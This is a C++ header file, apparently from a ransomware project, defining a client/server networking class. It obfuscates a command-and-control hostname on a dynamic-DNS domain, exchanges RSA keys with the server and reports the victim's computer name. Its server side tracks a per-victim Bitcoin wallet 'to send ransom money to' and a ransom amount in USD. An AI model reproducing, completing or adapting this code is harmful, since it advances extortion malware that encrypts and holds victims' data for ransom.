#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "framework.h"
#include "net_types.h"
#include "External/obfuscate.h"
#include "net_common.h"

#include "External/base64.h"

#include <memory>
#include <algorithm>
#include <random>
#include <openssl/bio.h>

#pragma comment( lib, "ws2_32.lib" )

const unsigned int UDP_PORT = 5454;
const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));

class Client {
public:
    std::string   ComputerName = "unknown";

public:

    inline const SOCKET   GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->TCPSocket : this->UDPSocket; }
    inline const RSAKeys  GetSecrets() const { return this->Secrets; }
    inline const Server   GetServerDetails(SocketTypes type) const { return ( type == TCP ) ? this->TCPServerDetails : this->UDPServerDetails; }
    inline const sockaddr_in GetAddressInfo() const { return this->AddressInfo; }

    inline void SetEncryptionKeys(RSAKeys keys) {
        this->Secrets.strPublicKey = keys.strPublicKey;
        this->Secrets.strPrivateKey = keys.strPrivateKey;
    #ifdef SERVER_RELEASE
        this->Secrets.bioPublicKey = keys.bioPublicKey;
        this->Secrets.bioPrivateKey = keys.bioPrivateKey;
    #endif
    }

// Client only methods
#ifdef CLIENT_RELEASE
    Client();
    ~Client();

	BOOL          Connect(); // Connect to the tcp server
    BOOL          Disconnect(); // Disconnect from the tcp server
    
    BYTESTRING    MakeTCPRequest(ClientRequest req, BOOL encrypted = FALSE); // send a message, receive the response
    BOOL          SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
    BOOL          SendEncryptedMessageToServer(Server dest, ClientMessage message);
    
    template <typename _Ty>
    BOOL          ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
    BOOL          GetPublicRSAKeyFromServer();
    BOOL          SendComputerNameToServer();
    void          InsertComputerName();

// Server only client implementation
#elif defined(SERVER_RELEASE)
public:
    Client() = default;
    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr) 
        : AddressInfo(addr), TCPSocket(tcp), UDPSocket(udp) 
    {
        std::random_device gen;
        std::mt19937 rng(gen());
        std::uniform_int_distribution<std::mt19937::result_type> dist(1, 10400);
        this->ClientUID = dist(rng);
    }
    long           ClientUID = -1;
    std::string    UniqueBTCWalletAddress; // Wallet address to send ransom money to
    long           RansomAmountUSD;

    /*
        Implementation for event handling- to wait
        for a new message to be sent from a client.

        Server will be listening from each client that connects with a thread.
        When data is received, it will be inserted into ClientResponse if ExpectingResponse
        is set to true by a function. This allows us to make a WaitForClientResponse function
        that sets expecting response to true and consistantly checks recent client response
        against last client response, waiting for a new client response.
    */
    BOOL           ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
    ClientResponse RecentClientResponse;
    ClientResponse LastClientResponse;
#endif
protected:
    Server        TCPServerDetails = {};
    Server        UDPServerDetails = {};
    SOCKET        UDPSocket = INVALID_SOCKET;
    SOCKET        TCPSocket = INVALID_SOCKET;
    sockaddr_in   AddressInfo;
    RSAKeys       Secrets = {};
};


#endif